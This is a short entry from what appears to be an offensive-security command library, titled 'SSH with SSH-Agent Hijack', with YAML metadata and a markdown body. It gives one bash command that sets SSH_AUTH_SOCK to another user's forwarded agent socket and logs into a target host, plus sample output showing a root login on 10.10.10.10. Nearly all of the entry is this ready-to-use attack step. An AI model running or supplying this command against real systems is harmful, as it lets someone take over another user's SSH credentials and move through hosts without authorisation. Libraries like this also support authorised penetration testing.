---
id: e36fb34d-8ed4-46e6-9b7d-9dae7b5932ef
name: SSH with SSH-Agent Hijack
type: command
executor: bash
data: SSH_AUTH_SOCK=agent.XXX ssh $_USER@$_TARGET_IP
output: root@host:~# SSH_AUTH_SOCK=agent.jDhFSu7EeAnz ssh root@10.10.10.10
created_at: '2019-10-22T00:49:09.003178+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SSH with SSH-Agent Hijack

```bash
SSH_AUTH_SOCK=agent.XXX ssh $_USER@$_TARGET_IP
```

## Expected Output

```
root@host:~# SSH_AUTH_SOCK=agent.jDhFSu7EeAnz ssh root@10.10.10.10
```
